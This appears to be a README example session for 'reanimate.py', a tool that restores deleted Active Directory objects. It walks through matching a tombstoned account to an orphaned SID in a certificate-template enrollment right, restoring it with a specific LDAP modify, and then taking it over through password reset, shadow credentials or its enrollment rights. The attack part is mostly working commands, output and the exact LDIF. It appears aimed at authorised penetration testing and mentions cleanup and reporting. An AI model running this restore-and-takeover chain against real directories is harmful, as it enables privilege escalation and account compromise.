# Example session

Values below are from a real domain (names sanitised to `corp.local`). The scenario is the classic one:
a tombstone that other tooling cannot resolve, and **three deleted objects sharing one CN**.

## 1. What is in the bin

```console
$ ./reanimate.py list -H dc01.corp.local -u jdoe -p '***' --base 'DC=corp,DC=local'
#   name                   RID          GUID                                 lastKnownParent
-------------------------------------------------------------------------------------------------
1   cert_admin             1109         4f2a9c31-6d80-4f11-8b5e-2c7a4d9e0011 OU=ADCS,DC=corp,DC=local
2   cert_admin             1110         7d1e4b02-9a33-4c7e-91f0-5b6c8d2a7722 OU=ADCS,DC=corp,DC=local
3   cert_admin             1111         938182c3-bf0b-410a-9aaa-45c8e1a02ebf OU=ADCS,DC=corp,DC=local
4   old_ws01$              1204         b1c3d5e7-0f21-4a6b-8c9d-1e2f3a4b5c6d OU=Workstations,DC=corp,DC=local
```

Three identical CNs. Restoring "by name" here is a coin flip, and only one of them is the identity whose
rights you were chasing.

## 2. Which one matters

The trigger is usually an unreachable SID in someone else's output — for example a certificate template
enrollment right that names a deleted account:

```console
$ certipy find -u jdoe@corp.local -p '***' -dc-ip 10.0.0.10 -stdout -enabled | grep -i "failed to lookup"
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
```

Match it, instead of guessing:

```console
$ ./reanimate.py list -H dc01 -u jdoe -p '***' --base 'DC=corp,DC=local' --sid 'S-1-5-21-1392491010-1358638721-2126982587-1111'
#   name                   RID          GUID                                 lastKnownParent
-------------------------------------------------------------------------------------------------
1   cert_admin             1111         938182c3-bf0b-410a-9aaa-45c8e1a02ebf OU=ADCS,DC=corp,DC=local
```

## 3. Refuses to guess

```console
$ ./reanimate.py restore -H dc01 -u jdoe -p '***' --base 'DC=corp,DC=local' --name cert_admin
… three candidates printed …
ERROR: 3 tombstones match — disambiguate with --guid, --sid or --rid (same-named tombstones are NOT interchangeable)
$ echo $?
2
```

## 4. Dry-run, then apply

```console
$ ./reanimate.py restore -H dc01 -u jdoe -p '***' --base 'DC=corp,DC=local' --rid 1111
selected: cert_admin  (GUID 938182c3-bf0b-410a-9aaa-45c8e1a02ebf, RID 1111)
tombstone DN: 'CN=cert_admin\\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=corp,DC=local'
lastKnownParent: OU=ADCS,DC=corp,DC=local
restore DN: CN=cert_admin,OU=ADCS,DC=corp,DC=local

[dry-run] add --apply to perform the restore. AD restores an object with a modify that
    REPLACE distinguishedName = <restore DN>
    DELETE  isDeleted
  sent against the tombstone DN with the SHOW_DELETED control (critical).
  NB: 'isDeleted=FALSE' alone is NOT accepted — AD answers unwillingToPerform.

$ ./reanimate.py restore -H dc01 -u jdoe -p '***' --base 'DC=corp,DC=local' --rid 1111 --apply
modify result: True  success
verified restored: CN=cert_admin,OU=ADCS,DC=corp,DC=local
```

Independent confirmation, without this tool:

```console
$ ldapsearch -x -H ldap://10.0.0.10 -D 'jdoe@corp.local' -w '***' -b 'DC=corp,DC=local' '(sAMAccountName=cert_admin)' distinguishedName objectSid
distinguishedName: CN=cert_admin,OU=ADCS,DC=corp,DC=local
objectSid:: AQUAAAAAAAUVAAAAArr/UoEu+1C7Lcd+VwQAAA==
```

The object is a normal directory object again, under its last-known parent — take it over the usual way
(own it, reset its password, shadow-credential it, or use the enrollment rights it carried).

## 5. Cleanup

Bringing an object back is a directory change. If you only needed it for one step, return it to the tombstone
state (`Remove-ADUser -Identity cert_admin -Confirm:$false`, or `bloodyAD … remove object cert_admin`) — and
treat the restore + delete pair as reportable actions.

## The gotcha that costs an hour

AD does **not** restore an object by setting `isDeleted` to FALSE. The modify has to **move the DN** out of
`CN=Deleted Objects` and **delete** the `isDeleted` attribute in the same operation:

```ldif
dn: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=corp,DC=local
changetype: modify
replace: distinguishedName
distinguishedName: CN=cert_admin,OU=ADCS,DC=corp,DC=local
-
delete: isDeleted
-
```

The tombstone DN contains a `0x0A` byte between the name and `DEL:` (escaped tools show `\0ADEL`). Send the
wrong shape and the DC answers **`unwillingToPerform`** — which reads like a permission problem and is
actually a malformed request. The restore DN comes from `msDS-LastKnownRDN` + `lastKnownParent`, which is why
the tool reads those two attributes first (and refuses to restore if `lastKnownParent` is missing, unless you
pass `--new-parent`).
